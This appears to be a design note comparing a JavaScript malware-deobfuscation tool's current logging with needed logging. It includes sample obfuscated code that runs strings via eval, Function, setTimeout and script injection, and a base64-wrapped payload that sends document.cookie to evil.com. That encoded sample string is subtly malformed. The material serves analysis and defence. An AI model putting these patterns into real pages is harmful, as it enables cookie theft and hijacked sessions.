# Quick Visual Comparison: Current vs. Needed

## What Malware Does

```javascript
// Step 1: Decode base64
const payload = atob('Y29uc29sZS5sb2coImV2aWwiKQ==');

// Step 2: Execute via eval
eval(payload);

// Step 3: Execute via Function
new Function(payload)();

// Step 4: Execute via setTimeout
setTimeout(payload, 0);

// Step 5: Execute via script injection
document.body.innerHTML = '<script>' + payload + '</script>';
```

---

## What js_unshroud Currently Captures

```json
{"type": "console", "message": "evil"}
```

**That's it.** One console event showing the final output.

---

## What js_unshroud SHOULD Capture

```json
{"type": "encoding", "method": "atob", "input": "Y29uc29sZS5sb2co...", "output": "console.log(\"evil\")"}
{"type": "code_execution", "method": "eval", "code": "console.log(\"evil\")"}
{"type": "code_execution", "method": "Function", "code": "console.log(\"evil\")"}
{"type": "timer", "timerType": "setTimeout", "handler": "console.log(\"evil\")"}
{"type": "script_injection", "method": "innerHTML", "content": "<script>console.log(\"evil\")</script>"}
{"type": "console", "message": "evil"}
{"type": "console", "message": "evil"}
{"type": "console", "message": "evil"}
{"type": "console", "message": "evil"}
```

**Full deobfuscation timeline** with every step visible.

---

## Real Malware Scenario

### Malicious Code:
```javascript
eval(atob('dmFyIGM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMDQsMTE2LDExNiwxMTIsMTE1LDU4LDQ3LDQ3LDEwMSwxMTgsMTA1LDEwOCw0NiwxOTksxMTEsMTA5KTtmZXRjaChjKy'+
  'cvY29va2llPycrZG9jdW1lbnQuY29va2llKQ=='));
```

---

### Current js_unshroud Output:
```json
{
  "type": "network",
  "method": "GET", 
  "url": "https://evil.com/cookie?sessionid=abc123"
}
```

**Analysis:** We see the cookie was stolen, but not how the malware decoded itself.

---

### With Proper Instrumentation:
```json
{
  "type": "encoding",
  "method": "atob",
  "input": "dmFyIGM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMDQsMTE2...",
  "output": "var c=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109);fetch(c+'/cookie?'+document.cookie)"
}
{
  "type": "code_execution",
  "method": "eval",
  "code": "var c=String.fromCharCode(...);fetch(c+'/cookie?'+document.cookie)"
}
{
  "type": "encoding",
  "method": "fromCharCode",
  "charCodes": [104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109],
  "result": "https://evil.com"
}
{
  "type": "network",
  "method": "GET",
  "url": "https://evil.com/cookie?sessionid=abc123"
}
```

**Analysis:** Complete attack chain visible - we can see:
1. Base64 layer decoded
2. eval executed
3. String.fromCharCode decoded the URL
4. Network request to exfiltrate cookie

---

## Coverage Statistics

| Capability | Current | Needed |
|------------|---------|--------|
| **Obfuscation Decoding** | 0/5 methods | 5/5 methods |
| **Code Execution** | 0/24 methods | 24/24 methods |
| **Behavior Monitoring** | 4/4 (network, console, storage, errors) | 4/4 ✓ |
| **Overall Coverage** | ~15% | ~100% |

---

## The Gap

```
    ┌─────────────────────────────────────────┐
    │  Malware Deobfuscation & Execution      │
    ├─────────────────────────────────────────┤
    │  ❌ atob/btoa                           │ <- NOT CAPTURED
    │  ❌ String.fromCharCode                  │ <- NOT CAPTURED  
    │  ❌ eval                                  │ <- NOT CAPTURED
    │  ❌ Function()                            │ <- NOT CAPTURED
    │  ❌ setTimeout(string)                    │ <- NOT CAPTURED
    │  ❌ innerHTML with <script>               │ <- NOT CAPTURED
    │  ❌ createElement('script')               │ <- NOT CAPTURED
    │  ❌ Workers                                │ <- NOT CAPTURED
    │  ❌ Dynamic imports                        │ <- NOT CAPTURED
    └─────────────────────────────────────────┘
                    ↓
    ┌─────────────────────────────────────────┐
    │  Malware Behavior (After Execution)     │
    ├─────────────────────────────────────────┤
    │  ✅ Network requests                     │ <- CAPTURED ✓
    │  ✅ Console output                        │ <- CAPTURED ✓
    │  ✅ Storage operations                    │ <- CAPTURED ✓
    │  ✅ Errors                                 │ <- CAPTURED ✓
    └─────────────────────────────────────────┘
```

**Problem:** We're only seeing the bottom part. The top part (deobfuscation) is completely invisible.

---

## Conclusion

**Yes, there are 24 methods beyond eval to execute JavaScript.**

**No, js_unshroud doesn't instrument any of them.**

This makes it a **behavior monitor** (good for seeing what malware does) but not a **deobfuscation tool** (cannot see how malware unpacks itself).

For malware analysis, you need both.
